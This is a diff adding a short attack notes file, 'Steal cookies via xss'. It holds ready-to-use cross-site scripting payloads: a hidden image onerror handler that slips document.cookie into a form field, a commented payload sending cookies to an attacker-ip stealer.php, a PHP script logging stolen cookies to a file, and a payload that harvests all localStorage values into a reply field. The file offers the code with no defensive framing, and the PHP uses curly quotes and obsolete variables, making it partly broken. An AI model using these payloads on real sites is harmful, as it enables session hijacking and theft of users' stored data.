@@ -1,0 +1,24 @@
+Steal cookies via xss
+1) hidden in html span tag
+<div style="display: none;">
+<img src="fgfdgNotExistent" onerror=
+"document.getElementById('form').onsubmit=function () {
+var hidden='<span style=\'display:none;\'>
+'+document.cookie+'</span>';
+document.getElementById('message').value+=hidden;}"/>
+</div>
+
+2) using PHP
+<?php
+/* ref: https://breakthesecurity.cysecurity.org/2012/01/how-to-do-cookie-stealing-with-cross-site-scripting-vulnerability-xss-tutorials.html
+*<script>location.href = ‘http://<attacker-ip>/stealer.php?cookie=’+document.cookie;</script>
+*
+*/
+$cookie = $HTTP_GET_VARS[“cookie”];
+$steal = fopen(“cookiefile.txt”, “a”);
+fwrite($steal, $cookie .”\n”);
+fclose($steal);
+?>
+
+Javascript to read html5 local storage:
+<img style="display:none;" src="notExistent.foo" onerror="function steal(){var theft='----';for(var i=0;i<localStorage.length;i++){theft+=localStorage.getItem(i);theft+='----';}document.getElementById('reply').value=document.getElementById('reply').value+theft;}document.getElementById('sendButton').onclick=function(){steal();send();}""/>r
